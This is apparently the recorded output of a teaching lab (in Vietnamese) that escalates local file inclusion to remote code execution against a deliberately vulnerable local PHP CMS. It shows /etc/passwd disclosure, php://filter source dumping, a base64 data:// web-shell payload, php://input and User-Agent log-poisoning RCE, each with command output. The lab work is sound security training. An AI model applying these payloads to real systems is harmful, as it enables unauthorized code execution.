@@ -1,0 +1,33 @@
+# Transcript lab 7.3 - LFI -> RCE (chay that 2026-10-18 17:23)
+# App: php -S 127.0.0.1:8063 -t www -d allow_url_include=1 -d allow_url_fopen=1 | Exploit: bash exploit.sh
+
+=== [0] Dung binh thuong ===
+Mini CMSMini CMSDang xem: pages/home.phpChao mung toi Mini CMS. Day la trang chu.Thu: ?page=pages/about.php
+
+=== [1] LFI co dien: doc /etc/passwd qua include ===
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+
+=== [2] php://filter: doc SOURCE index.php (base64) roi giai ma ===
+<?php
+// Lab 7.3 - LFI leo thang RCE (co y de lo hong)
+// Mini CMS: chon "trang" de hien thi. LOI: include thang tham so nguoi dung.
+// Ngoai ra ghi User-Agent moi request vao logs/access.log => phuc vu log poisoning.
+
+$log = __DIR__ . '/../logs/access.log';
+@file_put_contents(
+    $log,
+
+=== [3] data:// wrapper: nhung PHP qua base64 -> RCE (can allow_url_include) ===
+<!doctype html><meta charset=utf-8><title>Mini CMS</title><h1>Mini CMS</h1><p>Dang xem: data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyA/Pg==</p><hr>uid=1000(haipanda) gid=1000(Administrator) groups=1000(Administrator),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),1001(docker)
+
+=== [4] php://input: body la ma PHP -> RCE (can allow_url_include) ===
+<!doctype html><meta charset=utf-8><title>Mini CMS</title><h1>Mini CMS</h1><p>Dang xem: php://input</p><hr>INPUT_RCE: uid=1000(haipanda) gid=1000(Administrator) groups=1000(Administrator),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),1001(docker)
+
+=== [5] Log poisoning: nhet PHP vao User-Agent roi include access.log ===
+    5a) gui request voi UA doc hai (ghi vao logs/access.log)
+    5b) include file log -> PHP trong UA duoc thuc thi
+2026-10-18T17:23:25+07:00 UA=LOG_RCE: uid=1000(haipanda) gid=1000(Administrator) groups=1000(Administrator),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),1001(docker)
+
+=== DONE ===
